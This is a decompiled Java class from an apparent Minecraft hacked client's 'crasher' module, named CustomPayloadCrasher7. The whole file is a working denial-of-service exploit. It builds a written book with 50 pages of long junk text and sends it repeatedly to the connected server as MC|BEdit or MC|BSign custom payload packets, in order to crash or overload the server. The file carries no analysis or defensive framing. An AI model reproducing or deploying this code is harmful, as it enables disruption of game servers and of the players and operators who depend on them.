// 
// Decompiled by Procyon v0.6.0
// 

package me.amkgre.bettercraft.client.mods.crasher.cpc;

import net.minecraft.network.Packet;
import net.minecraft.network.play.client.CPacketCustomPayload;
import net.minecraft.client.Minecraft;
import net.minecraft.network.PacketBuffer;
import io.netty.buffer.Unpooled;
import net.minecraft.nbt.NBTBase;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.item.ItemStack;
import net.minecraft.init.Items;
import java.util.Random;

public class CustomPayloadCrasher7
{
    public static Random rand;
    public static double packets;
    
    static {
        CustomPayloadCrasher7.rand = new Random();
        CustomPayloadCrasher7.packets = 10.0;
    }
    
    public static void start() {
        new Thread() {
            @Override
            public void run() {
                final ItemStack bookObj = new ItemStack(Items.WRITTEN_BOOK);
                final String author = "Mees" + Math.random() * 400.0;
                final String title = "xD" + Math.random() * 400.0;
                final String mm255 = "wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5";
                final NBTTagCompound tag = new NBTTagCompound();
                final NBTTagList list2 = new NBTTagList();
                for (int i = 0; i < 50; ++i) {
                    final String siteContent = mm255;
                    final NBTTagString tString = new NBTTagString(siteContent);
                    list2.appendTag(tString);
                }
                tag.setString("author", author);
                tag.setString("title", title);
                tag.setTag("pages", list2);
                if (bookObj.hasTagCompound()) {
                    final NBTTagCompound nbttagcompound = bookObj.getTagCompound();
                    nbttagcompound.setTag("pages", list2);
                }
                else {
                    bookObj.setTagInfo("pages", list2);
                }
                String s2 = "MC|BEdit";
                if (CustomPayloadCrasher7.rand.nextBoolean()) {
                    s2 = "MC|BSign";
                }
                bookObj.setTagCompound(tag);
                final PacketBuffer packetbuffer = new PacketBuffer(Unpooled.buffer());
                packetbuffer.writeItemStackToBuffer(bookObj);
                try {
                    for (int k = 0; k < CustomPayloadCrasher7.packets; ++k) {
                        Minecraft.getMinecraft().player.connection.sendPacket(new CPacketCustomPayload(s2, packetbuffer));
                        Thread.sleep(1000L);
                    }
                }
                catch (final Throwable t) {
                    t.printStackTrace();
                }
            }
        }.start();
    }
}
